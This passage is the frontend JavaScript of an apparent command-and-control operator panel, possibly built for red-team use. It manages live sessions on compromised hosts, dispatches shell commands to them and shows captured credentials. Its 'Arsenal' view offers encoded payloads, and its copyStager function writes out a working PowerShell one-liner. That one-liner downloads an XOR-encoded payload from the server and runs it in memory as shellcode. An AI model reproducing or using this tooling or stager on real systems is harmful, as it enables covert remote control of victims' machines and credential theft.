  const opts = ['<option value="">— select session —</option>'];
  sids.forEach(sid => {
    const s = liveSessions[sid];
    const label = sid.slice(0,16) + ' | ' + s.host + (s.stale ? ' [STALE]' : '');
    opts.push(`<option value="${esc(sid)}" ${sid===cur?'selected':''}>${esc(label)}</option>`);
  });
  sel.innerHTML = opts.join('');
}

function shellSelectSession(sid) {
  shellSid = sid || null;
  const s = liveSessions[sid] || null;
  const hostEl   = document.getElementById('shell-host');
  const ipEl     = document.getElementById('shell-ip');
  const statEl   = document.getElementById('shell-status');
  const killBtn  = document.getElementById('btn-kill');

  if (s) {
    hostEl.textContent  = s.host;
    ipEl.textContent    = '  [' + sid.slice(0,16) + ']';
    hostEl.style.display = '';
    ipEl.style.display   = '';
    killBtn.style.display = '';
    if (s.stale) {
      statEl.innerHTML = '<span class="badge badge-stale">STALE</span>';
    } else {
      statEl.innerHTML = '<span class="dot dot-green"></span><span class="badge badge-alive">ALIVE</span>';
    }
  } else {
    hostEl.style.display = 'none';
    ipEl.style.display   = 'none';
    statEl.innerHTML     = '';
    killBtn.style.display = 'none';
  }
  document.getElementById('shell-input').focus();
}

function shellKeydown(e) {
  if (e.key === 'Enter') { shellSend(); return; }
  if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (histIdx < shellHistory.length-1) histIdx++;
    document.getElementById('shell-input').value = shellHistory[shellHistory.length-1-histIdx] || '';
    return;
  }
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (histIdx > 0) histIdx--;
    else { histIdx = -1; document.getElementById('shell-input').value = ''; return; }
    document.getElementById('shell-input').value = shellHistory[shellHistory.length-1-histIdx] || '';
  }
}

function shellQuick(cmd) {
  document.getElementById('shell-input').value = cmd;
  document.getElementById('shell-input').focus();
}

async function shellSend() {
  const input = document.getElementById('shell-input');
  const cmd   = input.value.trim();
  if (!cmd || !shellSid) {
    if (!shellSid) shellAppend('info', '— no session selected');
    return;
  }
  input.value = '';
  histIdx = -1;
  shellHistory.push(cmd);
  if (shellHistory.length > 200) shellHistory.shift();

  shellAppend('prompt', 'C2> ');
  shellAppend('cmd', cmd);
  const pendEl = shellAppend('pending', '  ▸ dispatching...');

  try {
    const r = await fetch('/ui/api/c2/' + shellSid + '/task', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({cmd}),
    });
    if (!r.ok) {
      pendEl.className = 'sl sl-err';
      pendEl.textContent = '  [!] dispatch failed — session gone?';
      return;
    }
    const {task_id} = await r.json();
    pendEl.textContent = '  ▸ task ' + task_id.slice(0,8) + ' queued';

    let attempts = 0;
    const iv = setInterval(async () => {
      attempts++;
      try {
        const res = await fetch('/ui/api/c2/' + shellSid + '/result/' + task_id);
        if (res.status === 200) {
          clearInterval(iv);
          pendEl.remove();
          const txt = await res.text();
          shellAppend('output', txt || '(empty output)');
          shellScroll();
        } else if (res.status === 204) {
          pendEl.textContent = '  ▸ waiting... (' + attempts + ')';
        } else {
          clearInterval(iv);
          pendEl.className = 'sl sl-err';
          pendEl.textContent = '  [!] result ' + res.status;
        }
      } catch(e) {
        clearInterval(iv);
        pendEl.className = 'sl sl-err';
        pendEl.textContent = '  [!] poll error: ' + e.message;
      }
      if (attempts > 120) {
        clearInterval(iv);
        pendEl.className = 'sl sl-err';
        pendEl.textContent = '  [!] timeout (4 min)';
      }
    }, 2000);
  } catch(e) {
    pendEl.className = 'sl sl-err';
    pendEl.textContent = '  [!] error: ' + e.message;
  }
  shellScroll();
}

function shellAppend(type, text) {
  const out = document.getElementById('shell-out');
  const d   = document.createElement('div');
  d.className = 'sl sl-' + type;
  if (type === 'prompt') {
    d.style.display = 'inline';
    out.appendChild(d);
    d.textContent = text;
    return d;
  }
  if (type === 'cmd') {
    const last = out.lastChild;
    if (last && last.className === 'sl sl-prompt') {
      const span = document.createElement('span');
      span.style.cssText = 'color:#e5e7eb';
      span.textContent = text;
      out.appendChild(span);
      const br = document.createElement('br');
      out.appendChild(br);
      return span;
    }
  }
  d.textContent = text;
  out.appendChild(d);
  shellScroll();
  return d;
}

function shellScroll() {
  const out = document.getElementById('shell-out');
  out.scrollTop = out.scrollHeight;
}

function shellClear() {
  document.getElementById('shell-out').innerHTML = '';
}

async function shellKill() {
  if (!shellSid) return;
  if (!confirm('Kill session ' + shellSid + '?')) return;
  try {
    const r = await fetch('/ui/api/c2/' + shellSid, {method:'DELETE'});
    const d = await r.json();
    shellAppend('info', d.ok ? '  [*] session killed' : '  [!] kill failed');
    await fetchLive();
    shellSelectSession('');
    document.getElementById('shell-sess-select').value = '';
  } catch(e) {
    shellAppend('err', '  [!] error: ' + e.message);
  }
}

// ── Sessions view ─────────────────────────────────────────────────────────────
function renderSessions() {
  const tbody = document.getElementById('sess-tbody');
  const allSids = new Set([
    ...dbSessions.map(s => s.id),
    ...Object.keys(liveSessions),
  ]);
  if (!allSids.size) {
    tbody.innerHTML = '<tr><td colspan="7" style="color:var(--muted2);text-align:center;padding:20px">No sessions</td></tr>';
    return;
  }
  const rows = [];
  allSids.forEach(sid => {
    const db   = dbSessions.find(s => s.id === sid) || {};
    const live = liveSessions[sid] || null;
    const host = live ? live.host : (db.host || '—');
    const label = db.label || '';
    let statusHtml, lastSeen, queued;
    if (live) {
      const stale = live.stale;
      statusHtml = stale
        ? '<span class="badge badge-stale">STALE</span>'
        : '<span class="dot dot-green"></span><span class="badge badge-alive">ALIVE</span>';
      lastSeen = live.last_seen;
      queued   = live.pending;
    } else {
      statusHtml = '<span class="badge badge-dead">OFFLINE</span>';
      lastSeen = db.created_at ? db.created_at.slice(0,19) : '—';
      queued = 0;
    }
    const killBtn = live
      ? `<button class="btn btn-sm btn-red" onclick="killSess('${esc(sid)}')">KILL</button>`
      : '';
    const shellBtn = live
      ? `<button class="btn btn-sm" onclick="goShell('${esc(sid)}')">SHELL</button>`
      : '';
    rows.push(`<tr>
      <td class="mono" style="color:var(--muted2);font-size:11px">${esc(sid.slice(0,20))}</td>
      <td>${esc(host)}</td>
      <td style="color:var(--muted2)">${esc(label)}</td>
      <td>${statusHtml}</td>
      <td style="color:var(--muted2);font-size:11px">${esc(lastSeen)}</td>
      <td style="text-align:center">${queued}</td>
      <td style="display:flex;gap:5px;flex-wrap:wrap">${shellBtn}${killBtn}</td>
    </tr>`);
  });
  tbody.innerHTML = rows.join('');
}

async function killSess(sid) {
  if (!confirm('Kill session ' + sid + '?')) return;
  try {
    await fetch('/ui/api/c2/' + sid, {method:'DELETE'});
    await fetchLive();
    renderSessions();
  } catch(e) {}
}

// ── Arsenal ───────────────────────────────────────────────────────────────────
async function loadArsenal() {
  const body = document.getElementById('arsenal-body');
  const wsEl = document.getElementById('arsenal-ws');
  try {
    const r = await fetch('/ui/api/arsenal');
    const {workspace, files} = await r.json();
    wsEl.textContent = 'Workspace: ' + (workspace || '—');
    if (!files || !files.length) {
      body.innerHTML = '<div style="color:var(--muted2);font-size:12px">No files in workspace</div>';
      return;
    }
    const cats = {
      'enc':   {label:'ENCODED PAYLOADS (.enc)', items:[]},
      'dat':   {label:'STAGED DATA (.dat)',       items:[]},
      'ps1':   {label:'POWERSHELL STAGERS (.ps1)',items:[]},
      'exe':   {label:'EXECUTABLES (.exe)',       items:[]},
      'other': {label:'OTHER FILES',              items:[]},
    };
    files.forEach(f => {
      const e = f.ext.replace('.','') || 'other';
      if (cats[e]) cats[e].items.push(f);
      else cats.other.items.push(f);
    });
    const base = window.location.protocol + '//' + window.location.host;
    let html = '';
    Object.values(cats).forEach(cat => {
      if (!cat.items.length) return;
      html += `<div class="arsenal-cat">${cat.label}</div>`;
      cat.items.forEach(f => {
        const url = base + '/' + f.name;
        html += `<div class="file-row">
          <span class="file-ext">${esc(f.ext||'?')}</span>
          <span class="file-name">${esc(f.name)}</span>
          <span class="file-size">${fmt_size(f.size)}</span>
          <button class="copy-btn" onclick="copyURL(this,'${esc(url)}')">copy URL</button>
          <button class="copy-btn" onclick="copyStager(this,'${esc(f.name)}')">stager PS1</button>
        </div>`;
      });
    });
    body.innerHTML = html;
  } catch(e) {
    body.innerHTML = '<div style="color:var(--red2)">Error: ' + esc(e.message) + '</div>';
  }
}

function copyURL(btn, url) {
  navigator.clipboard.writeText(url).then(() => {
    btn.textContent = 'copied!';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent='copy URL'; btn.classList.remove('copied'); }, 2000);
  });
}

function copyStager(btn, fname) {
  const base = window.location.protocol + '//' + window.location.host;
  const stager = `$d=(New-Object Net.WebClient).DownloadData('${base}/${fname}');` +
    `$k=0x5A;$d=[byte[]]($d|%{$_-bxor$k});` +
    `$h=[System.Runtime.InteropServices.GCHandle]::Alloc($d,3);` +
    `([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(` +
    `$h.AddrOfPinnedObject(),[Action]))()`;
  navigator.clipboard.writeText(stager).then(() => {
    btn.textContent = 'copied!';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent='stager PS1'; btn.classList.remove('copied'); }, 2000);
  });
}

// ── ATT&CK ────────────────────────────────────────────────────────────────────
async function loadAttack() {
  try {
    const r = await fetch('/ui/api/techniques');
    const {all_techniques, tactic_order, covered} = await r.json();
    document.getElementById('atk-cov').textContent = Object.keys(covered).length;
    document.getElementById('atk-tot').textContent = Object.keys(all_techniques).length;
    const grid = document.getElementById('atk-grid');
    const byTactic = {};
    tactic_order.forEach(t => { byTactic[t] = []; });
    Object.entries(all_techniques).forEach(([tid, meta]) => {
      const tac = meta.tactic || 'Other';
      if (!byTactic[tac]) byTactic[tac] = [];
      byTactic[tac].push({tid, ...meta});
    });
    grid.innerHTML = tactic_order.map(tac => {
      const techs = (byTactic[tac]||[]);
      return `<div class="atk-col">
        <div class="atk-tactic">${esc(tac.toUpperCase())}</div>
        ${techs.map(t => {
          const isCov = covered[t.tid];
          const cnt   = isCov ? ' ×' + (isCov.length) : '';
          return `<div class="atk-tech ${isCov?'covered':''}">
            ${esc(t.name)}${cnt}
            <span class="atk-tid">${esc(t.tid)}</span>
          </div>`;
        }).join('')}
      </div>`;
    }).join('');
  } catch(e) {}
}

// ── Credentials ───────────────────────────────────────────────────────────────
async function loadCreds() {
  try {
    const r = await fetch('/ui/api/credentials');
    const creds = await r.json();
    const tbody = document.getElementById('creds-tbody');
    if (!creds.length) {
      tbody.innerHTML = '<tr><td colspan="4" style="color:var(--muted2);text-align:center;padding:20px">No credential findings</td></tr>';
      return;
    }
    tbody.innerHTML = creds.map(c => {
      const hints = (c.cred_hints||[]).map(h =>
        `<div class="hint">${esc(h.type||'')}  <strong>${esc(h.value||'')}</strong></div>`
      ).join('');
      return `<tr class="cred-row">
        <td>${esc((c.session_id||'').slice(0,12))}</td>
        <td>${esc(c.tool||'')}</td>
        <td style="color:var(--muted2);font-size:11px">${esc((c.captured_at||'').slice(0,19))}</td>
        <td>${hints || '<span style="color:var(--muted2)">—</span>'}</td>
      </tr>`;
    }).join('');
  } catch(e) {}
}

// ── Report ────────────────────────────────────────────────────────────────────
async function loadReport() {
  try {
    const r = await fetch('/ui/api/sessions');
    const sessions = await r.json();
    const ed = document.getElementById('label-editor');
    ed.innerHTML = sessions.map(s => `
      <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
        <span style="color:var(--muted2);font-size:11px;width:120px">${esc((s.id||'').slice(0,14))}</span>
        <input style="flex:1;background:var(--surf3);border:1px solid var(--bord2);color:var(--text);
               font:12px var(--mono);padding:4px 8px;border-radius:3px;min-width:120px"
          placeholder="label" value="${esc(s.label||'')}" id="lbl-${esc(s.id)}">
        <input style="flex:2;background:var(--surf3);border:1px solid var(--bord2);color:var(--text);
               font:12px var(--mono);padding:4px 8px;border-radius:3px;min-width:200px"
          placeholder="note" value="${esc(s.note||'')}" id="note-${esc(s.id)}">
        <button class="btn btn-sm" onclick="saveLabel('${esc(s.id)}')">Save</button>
      </div>`).join('');
  } catch(e) {}
}

async function saveLabel(sid) {
  const label = document.getElementById('lbl-' + sid).value;
  const note  = document.getElementById('note-' + sid).value;
  await fetch('/ui/api/sessions/' + sid + '/label', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({label, note}),
  });
}

// ── Boot ──────────────────────────────────────────────────────────────────────
refreshAll();
setInterval(refreshAll, 5000);
</script>
</body>
</html>"""
